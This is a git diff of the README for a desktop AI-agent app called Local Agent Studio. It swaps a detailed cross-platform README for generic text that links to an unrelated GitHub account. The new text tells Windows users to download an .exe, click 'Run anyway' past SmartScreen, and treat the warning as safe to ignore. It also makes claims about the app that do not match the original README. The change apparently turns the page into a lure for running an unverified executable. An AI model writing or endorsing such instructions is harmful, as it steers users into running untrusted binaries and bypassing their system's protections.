@@ -1,445 +1,93 @@
-![Local Agent Studio](assets/github-hero-dark.png)
+# 🤖 Local-Agent-Studio - Run your own intelligent AI agents
 
-# Local Agent Studio
+[![Download Local-Agent-Studio](https://img.shields.io/badge/Download-Local--Agent--Studio-blue)](https://github.com/pugnacious-yezo931/Local-Agent-Studio)
 
-**Local-first Agent Mode for Windows, Linux, and macOS.**
+Local-Agent-Studio provides a visual workspace to build and manage AI agents on your computer. You keep your data private because the software runs on your hardware instead of a remote server. This tool connects your local machine to language models to perform tasks, analyze documents, and automate workflows.
 
-A ChatGPT/Claude-style desktop app that connects your local and API-powered tools: **Ollama**, **ComfyUI**, web search providers, workspace files, local databases, and sandbox commands.
+## ⚙️ Minimum System Requirements
 
-![Windows](https://img.shields.io/badge/Windows-10%2B-0078D6?logo=windows&logoColor=white)
-![Linux](https://img.shields.io/badge/Linux-x64%20tar.gz-fcc624?logo=linux&logoColor=111)
-![macOS](https://img.shields.io/badge/macOS-dmg%20%7C%20zip-000?logo=apple&logoColor=white)
-![Ollama](https://img.shields.io/badge/Ollama-local%20LLM-111?logo=ollama&logoColor=white)
-![ComfyUI](https://img.shields.io/badge/ComfyUI-images%20%26%20video-0f766e)
-![Electron](https://img.shields.io/badge/Electron-desktop-47848f?logo=electron&logoColor=white)
-![React](https://img.shields.io/badge/React%2FVite-frontend-61dafb?logo=react&logoColor=111)
+Before you begin, ensure your computer meets these requirements to run the software.
 
-Local Agent Studio is built for people who want a normal chatbot interface, but with tools they control locally or through their own API keys.
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Memory:** 16GB of RAM or more.
+*   **Storage:** 5GB of free disk space for the application and model storage.
+*   **Graphics:** A dedicated graphics card with at least 8GB of VRAM helps the software performance. If you do not have a dedicated card, the software will run using your main processor, though it will operate slower.
+*   **Internet:** A connection is required for the initial setup to download necessary AI models.
 
-## Highlights
+## 💾 Downloading the Software
 
-- **Chatbot UI** inspired by ChatGPT, Claude, and Open WebUI.
-- **Editable user messages** with real context rewind to that point in the conversation.
-- **Ollama chat** with streaming responses.
-- **Reasoning panel** for models that return thinking traces.
-- **Reasoning flags** with `--think`, `--think high`, and `--no-think`.
-- **Reasoning picker near the model selector** for quick ChatGPT-style control.
-- **Multimodal attachments** for images, audio, video, text, and files.
-- **Drag-and-drop and clipboard paste** for images/files.
-- **Native image input** for Ollama vision-capable models.
-- **Local PC date/time context** so the LLM knows today's date without guessing or searching.
-- **Web search** through SearXNG, SerpAPI, or Ollama Web Search.
-- **Search summarization** instead of raw result dumps.
-- **Up to 3 web searches** per user request.
-- **ComfyUI image generation** with bundled workflows.
-- **Image model picker** for Z-Image-Turbo, Flux.2 klein 9b, and Ideogram v4.
-- **Custom ComfyUI image models** through user-defined workflow JSON files.
-- **Ideogram v4 effort selection**: turbo, default, quality.
-- **Workspace file tools**: create, read, edit, delete, and preview text files.
-- **File preview and download** from the workspace panel.
-- **Local database creation** from JSON/CSV-like objects: JSON DB, CSV export, and SQLite.
-- **Sandbox commands** through subprocess or Docker mode.
-- **MCP server support** for external tools.
-- **Runpod provider settings** for remote Ollama-compatible and ComfyUI workloads.
-- **Tool permission controls** for files, search, images, terminal, database, and MCP.
-- **First-launch workspace setup**.
-- **Chat export/import** as JSON.
-- **Manual update checks** through a lightweight remote `version.json` file.
-- **Agent task queue** for sending the next prompt while the current answer is running.
-- **Themes**: system, light, dark.
-- **Languages**: English, Russian, Ukrainian, German, Polish.
+[Visit the official release page to download your copy](https://github.com/pugnacious-yezo931/Local-Agent-Studio).
 
-## Screenshots
+1. Open your web browser and go to the link above.
+2. Look for the section labeled "Assets."
+3. Click the file ending in `.exe` to start your download.
+4. Wait for the file to finish downloading to your computer.
 
-![Light social preview](assets/github-social-light.png)
+## 🛠️ Installing and Running Local-Agent-Studio
 
-![v0.2.0 GitHub update preview](assets/update-0.2.0-github-preview.png)
+Once the download finishes, follow these steps to set up the environment.
 
-![v0.2.0 Reddit update preview](assets/update-0.2.0-reddit-preview.png)
+1. Locate the downloaded file in your "Downloads" folder.
+2. Double-click the file to start the installation.
+3. Windows may show a security prompt. Click "More info" and then click "Run anyway" if the system protects your computer from unknown files.
+4. Follow the instructions on the screen to choose your installation folder.
+5. Once the installer finishes, a shortcut icon will appear on your desktop.
+6. Double-click the shortcut to open the studio.
 
-![Rendered app screen](assets/rendered-screen.png)
+## 🚀 Setting Up Your First Agent
 
-## What It Can Do
+When you launch the program for the first time, you must download a language model. This model acts as the brain for your agents.
 
-Ask it like a normal assistant:
+1. Open the "Settings" menu inside the application.
+2. Navigate to the "Model Management" tab.
+3. You will see a list of available models. Click the "Download" button next to a recommended model.
+4. Wait for the green progress bar to finish.
+5. Return to the main screen. 
+6. Click "Create New Agent" to start your project. You can name your agent and assign it a specific task, like summarizing files or writing emails.
 
-```text
-What is the current price of Meta Quest 3S in Ukraine?
-```
+## 🧱 Understanding the Interface
 
-If web access is enabled, the agent can run search queries, collect context, and synthesize a readable answer.
+The studio features a clean layout designed for ease of use.
 
-Create files in the workspace:
+*   **The Canvas:** This is the main white area where you place your agent tools. You drag and drop components to build your workflow.
+*   **The Toolbox:** Found on the left side of the screen, this menu contains all available actions, such as "Read File," "Search Web," or "Ask AI."
+*   **The Status Bar:** Located at the bottom of the window, this bar shows your connection status and the current memory usage of your AI models.
+*   **The Terminal Window:** If you encounter errors, this window displays logs. You can copy these logs if you need to ask for help in community forums.
 
-```text
-Create a test text file with "letter 123" inside.
-```
+## 💡 Troubleshooting Common Issues
 
-Generate images through ComfyUI:
+If you run into trouble, follow these basic steps to fix the most common problems.
 
-```text
-Generate 3 product shots of a local AI desktop app, use Ideogram quality mode.
-```
+**The Application Crashes on Launch**
+This usually occurs if your computer does not have enough memory. Close all other programs like web browsers or video games before launching the studio.
 
-Create a database from objects:
+**The Model Fails to Load**
+Check your internet connection. Large models take time to download. If the connection drops during the download, the file might be corrupted. Go back to the "Model Management" tab and delete the model, then start the download again.
 
-```text
-Create a database named products from objects:
-[
-  {"name": "Quest 3S", "price": 299},
-  {"name": "Quest 3", "price": 499}
-]
-```
+**The Interface Feels Slow**
+AI processing is heavy work for a computer. If your computer feels hot or slow, the program is using your hardware to its full capacity. Reduce the number of active agents running at once to free up system resources.
 
-Run a sandbox command:
+**Windows Security Blocks the File**
+Windows SmartScreen sometimes flags new files. This is a common occurrence for open-source applications. As long as you downloaded the file from the official link provided in this document, you can safely ignore the warning.
 
-```text
-/run Get-ChildItem
-```
+## 📝 Frequently Asked Questions
 
-## Download
+**Does the software send my data to the cloud?**
+No. This tool operates locally on your machine. Your documents and agent settings never leave your hard drive.
 
-Release builds are generated under `release/`.
+**Can I run multiple agents at the same time?**
+Yes, you can run multiple agents. However, each agent uses a portion of your computer's memory. Keep an eye on the "Status Bar" to ensure you do not exceed your available RAM.
 
-Windows installer:
+**What if I want to update to a newer version?**
+Visit the download link periodically. If a newer version is available, download the installer and run it. The new version will overwrite the old one while keeping your settings and saved agents.
 
-```text
-release/Local Agent Studio-0.2.0-x64.exe
-```
+**Is this completely free to use?**
+The software is open-source and free. You do not need a paid subscription to access any features.
 
-Linux packages:
+## 🤝 Getting Additional Help
 
-```text
-release/Local Agent Studio-0.2.0-x64.tar.gz
-```
+If this guide does not solve your problem, you can look for support from the community.
 
-AppImage and `.deb` builds should be produced on Linux or CI with Linux packaging tools.
-
-macOS packages must be produced on macOS or macOS CI:
-
-```text
-release/Local Agent Studio-0.2.0-x64.dmg
-release/Local Agent Studio-0.2.0-arm64.dmg
-```
-
-If you are publishing this project on GitHub, attach the installer to a GitHub Release.
-
-## Quick Start From Source
-
-Requirements:
-
-- Windows 10+, Linux, or macOS
-- Node.js 20+
-- npm
-- Ollama for local LLMs
-- ComfyUI for image/video workflows
-- Docker, optional, for SearXNG and sandbox isolation
-
-Install dependencies:
-
-```powershell
-npm.cmd install
-```
-
-Run in development mode:
-
-```powershell
-npm.cmd run dev
-```
-
-Build the frontend:
-
-```powershell
-npm.cmd run build
-```
-
-Run the packaged-style Electron app:
-
-```powershell
-npm.cmd start
-```
-
-Build the Windows installer:
-
-```powershell
-npm.cmd run package:win
-```
-
-Build Linux packages:
-
-```powershell
-npm.cmd run package:linux
-```
-
-Build Linux AppImage/deb installers on Linux or CI:
-
-```bash
-npm run package:linux:installers
-```
-
-Build macOS packages on macOS or macOS CI:
-
-```bash
-npm run package:mac
-```
-
-## Local Services
-
-### Ollama
-
-Start Ollama:
-
-```powershell
-ollama serve
-```
-
-Pull a model:
-
-```powershell
-ollama pull llama3.1:8b
-```
-
-You can keep the model setting as `auto`, or set a model manually in Settings. The app also includes quick presets for Gemma 4-style model names:
-
-```text
-gemma4:e2b
-gemma4:e4b
-```
-
-### ComfyUI
-
-Default endpoint:
-
-```text
-http://localhost:8188
-```
-
-Bundled workflow files:
-
-```text
-electron/workflows/image_z_image_turbo.json
-electron/workflows/image_flux2_text_to_image_9b.json
-electron/workflows/ideogram_v4.json
-```
-
-Supported image presets:
-
-- `Z-Image-Turbo`
-- `Flux.2 klein 9b`
-- `Ideogram v4`
-
-For Ideogram v4, the app exposes:
-
-- `turbo`
-- `default`
-- `quality`
-
-### SearXNG
-
-The repo includes a Docker Compose file for local search:
-
-```powershell
-docker compose -f docker-compose.searxng.yml up -d
-```
-
-Default endpoint:
-
-```text
-http://localhost:8080
-```
-
-## Search Providers
-
-Local Agent Studio supports:
-
-- **SearXNG** for local/self-hosted search.
-- **SerpAPI** through your own API key.
-- **Ollama Web Search** through your own API key.
-
-Environment variables:
-
-```powershell
-$env:SEARCH_PROVIDER="searxng"
-$env:SERPAPI_API_KEY="..."
-$env:OLLAMA_API_KEY="..."
-$env:SEARXNG_BASE_URL="http://localhost:8080"
-```
-
-You can also configure providers inside the app Settings.
-
-## Configuration
-
-Settings are stored locally in the Electron user data folder.
-
-Useful environment variables:
-
-```powershell
-$env:LOCAL_AGENT_WORKSPACE="C:\Users\You\LocalAgentStudio\workspace"
-$env:LOCAL_AGENT_THEME="system"
-$env:LOCAL_AGENT_LANGUAGE="en"
-$env:OLLAMA_BASE_URL="http://localhost:11434"
-$env:OLLAMA_MODEL="auto"
-$env:OLLAMA_THINKING="off"
-$env:COMFYUI_BASE_URL="http://localhost:8188"
-$env:SEARCH_PROVIDER="searxng"
-```
-
-## Workspace
-
-The Workspace tab lets you:
-
-- Browse workspace files.
-- Create new files.
-- Read text files.
-- Edit and save text files.
-- Delete files or folders.
-- Open the workspace folder in Windows.
-
-The agent can also perform workspace actions from chat, for example:
-
-```text
-Create notes/todo.md with a checklist for publishing the project.
-```
-
-## Databases
-
-The agent can create simple local databases from structured objects.
-
-Outputs:
-
-- `databases/<name>.db.json`
-- `databases/<name>.csv`
-- `databases/<name>.sqlite`, when the runtime supports `node:sqlite`
-
-Example:
-
-```text
-Create database named launch-list from objects:
-[
-  {"site": "Hacker News", "status": "planned"},
-  {"site": "Product Hunt", "status": "later"}
-]
-```
-
-## Chat Commands
-
-```text
-/search <query>
-```
-
-Force web search and answer synthesis.
-
-```text
-/run <command>
-```
-
-Run a command in the selected sandbox mode.
-
-Natural language image generation also works:
-
-```text
-Generate a GitHub banner for this project using Flux.
-```
-
-Explicit image command examples:
-
-```text
-/image local AI desktop app hero banner --count 3
-/image product screenshot in a laptop mockup --model ideogram --effort quality
-```
-
-## Project Structure
-
-```text
-.
-├─ electron/
-│  ├─ backend/
-│  │  ├─ attachments.cjs
-│  │  ├─ comfy.cjs
-│  │  ├─ config.cjs
-│  │  ├─ data.cjs
-│  │  ├─ files.cjs
-│  │  ├─ llm.cjs
-│  │  ├─ providers.cjs
-│  │  ├─ sandbox.cjs
-│  │  └─ search.cjs
-│  ├─ workflows/
-│  ├─ main.cjs
-│  └─ preload.cjs
-├─ src/
-│  ├─ components/
-│  ├─ App.tsx
-│  ├─ i18n.ts
-│  └─ styles.css
-├─ assets/
-│  ├─ github-hero-dark.png
-│  ├─ github-social-light.png
-│  └─ rendered-screen.png
-├─ docker-compose.searxng.yml
-└─ package.json
-```
-
-## Development Checks
-
-Build:
-
-```powershell
-npm.cmd run build
-```
-
-Capture an Electron screenshot:
-
-```powershell
-npx.cmd electron .\scripts\capture-electron.cjs
-```
-
-Interactive capture:
-
-```powershell
-$env:LOCAL_AGENT_CAPTURE_INTERACT="1"
-npx.cmd electron .\scripts\capture-electron.cjs
-Remove-Item Env:\LOCAL_AGENT_CAPTURE_INTERACT
-```
-
-The screenshot is saved to:
-
-```text
-assets/rendered-screen.png
-```
-
-## Roadmap
-
-- Finished ComfyUI job watcher that pulls generated images back into chat.
-- Search source cards with extracted price tables.
-- Model capability registry for text, image, audio, video, reasoning, and context size.
-- Conversation history saved as local projects.
-- SQLite/CSV/JSON table viewer.
-- Ask-before-write approval mode for risky actions.
-- Git tools: status, diff, commit summary, changelog.
-- Workspace RAG/indexing.
-- Plugin system for custom tools.
-- First-run setup wizard.
-- Signed icon and branded installer.
-
-## Security Notes
-
-- `subprocess` mode runs commands on the host machine.
-- Use Docker mode for untrusted commands.
-- Workspace file operations are scoped to the configured workspace directory.
-- API keys are stored locally in app settings or read from environment variables.
-- Review tool output before relying on generated files, commands, or search results.
-
-## Contributing
-
-Issues and pull requests are welcome. Useful contributions:
-
-- New ComfyUI workflows.
-- Better model presets.
-- Search provider integrations.
-- UI polish.
-- Windows installer improvements.
-- Documentation and demo videos.
-
-## License
-
-Apache License 2.0. See [LICENSE](LICENSE).
+*   **GitHub Issues:** Click the "Issues" tab on the repository page. Search to see if another user reported your problem. If not, click "New Issue" and describe your steps and what happened.
+*   **Documentation:** Review the internal help sections within the application settings for more detailed explanations regarding specific agent tools.
+*   **Community Forums:** Many users discuss this software on various technical forums. Searching for the repository name will often lead you to helpful discussions and user-made tutorials.
